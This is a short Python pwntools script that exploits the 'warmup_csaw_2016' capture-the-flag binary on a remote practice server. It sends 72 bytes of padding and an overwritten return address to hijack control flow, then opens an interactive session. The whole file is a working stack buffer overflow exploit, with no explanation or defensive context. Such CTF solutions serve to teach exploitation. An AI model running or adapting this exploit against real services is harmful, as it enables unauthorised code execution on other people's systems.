#!/usr/bin/python
#__author__:TaQini

from pwn import *
context.log_level = 'debug'

len = 72

# p = process('./warmup_csaw_2016')
p = remote('node3.buuoj.cn',28107)

p.recvuntil('>')

# gdb.attach(p)

ret = 0x40060d

p.sendline('a'*len+p64(ret))

p.interactive()
